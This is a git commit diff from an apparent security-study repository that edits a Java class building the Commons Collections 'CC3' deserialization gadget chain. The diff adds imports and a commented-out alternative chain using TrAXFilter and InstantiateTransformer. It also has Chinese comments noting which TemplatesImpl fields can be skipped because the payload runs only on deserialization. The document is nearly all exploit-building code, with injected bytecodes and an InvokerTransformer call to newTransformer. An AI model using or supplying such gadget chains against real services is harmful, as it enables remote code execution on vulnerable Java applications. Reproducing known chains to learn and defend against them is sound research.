9d6e439430567fcd5b38fbef8faa88d781e06610
Sakkana <642835027@qq.com>
2025-02-23 00:41:56 +0800

    reproduce cc4, fix cc3

--- src/main/java/cc3/CC3Chain.java
+++ src/main/java/cc3/CC3Chain.java
@@ -1,14 +1,17 @@
 package cc3;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
 import toolkit.Seriliazation;
 
+import javax.xml.transform.Templates;
 import javax.xml.transform.TransformerConfigurationException;
 import java.io.File;
 import java.io.FileDescriptor;
@@ -58,11 +61,14 @@ public class CC3Chain {
         };
         fieldBytecodes.set(templates,  bytecodes);
 
-        Field fieldTfactory = clazz_templatesImpl.getDeclaredField("_tfactory");
-        fieldTfactory.setAccessible(true);
-        fieldTfactory.set(templates, new TransformerFactoryImpl());
+        // 这仨没必要赋值
 
-        // 这俩没必要赋值
+        // ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()
+        // 因为不在本地运行，只需要在反序列化的时候运行，因此可以不管
+//        Field fieldTfactory = clazz_templatesImpl.getDeclaredField("_tfactory");
+//        fieldTfactory.setAccessible(true);
+//        fieldTfactory.set(templates, new TransformerFactoryImpl());
+
 //        Field fieldAuxClasses = clazz_templatesImpl.getDeclaredField("_auxClasses");
 //        fieldAuxClasses.setAccessible(true);
 //        fieldAuxClasses.set(templates, new HashMap<String, Class<?>>());
@@ -75,6 +81,13 @@ public class CC3Chain {
                 new ConstantTransformer(templates),
                 new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{}),
                 new ConstantTransformer(new HashSet<String>())
+                /**
+                 * 另一种利用方法
+                */
+                // 这个类是不能序列化的
+//                new org.apache.commons.collections4.functors.ConstantTransformer(TrAXFilter.class),
+//                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
+//                new org.apache.commons.collections4.functors.ConstantTransformer(new HashSet<>())
         };
 
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
